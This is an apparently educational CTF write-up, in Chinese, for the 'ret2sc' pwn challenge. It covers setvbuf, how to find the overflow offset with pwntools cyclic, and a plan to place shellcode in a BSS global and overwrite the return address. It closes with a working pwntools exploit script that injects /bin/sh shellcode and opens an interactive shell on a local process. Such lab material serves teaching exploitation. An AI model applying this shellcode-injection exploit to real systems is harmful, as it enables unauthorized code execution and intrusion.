## 先備知識

### setvbuf()

`int setvbuf(FILE *stream, char *buffer, int mode, size_t size)`

定義了stream的buffer怎麼被緩衝

- buffer 分配的緩衝區，如果是NULL會自動分配
- mode 0: FUll  buffering、1: Line buffering、2: No buffering
- size 單個緩衝區大小

這裡使用setvbuf(stdout, 0, 2, 0)設定為無緩衝

## Solve

### 分析

有兩個input，其中`name`為全域變數存放在BSS區段，而`buf`則存放在stack中

### how to find offest

from pwn import *

cyclic(100)

cyclic_find("<return overflow string>")

### 解題策略

將shellcode塞在name中，並且利用BOF將return的值蓋掉，跳轉到name的地方。

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

r = process('./ret2sc')
name = 0x804a060 # address of name (BSS) where we are going to placed return 
r.recvuntil(":")
r.sendline(asm(shellcraft.sh())) # /bin/shell shellcode
r.recvuntil(":")
payload = "a"*32 # buffer size 
payload += p32(name) # overflow return 
r.sendline(payload)

r.interactive()
```
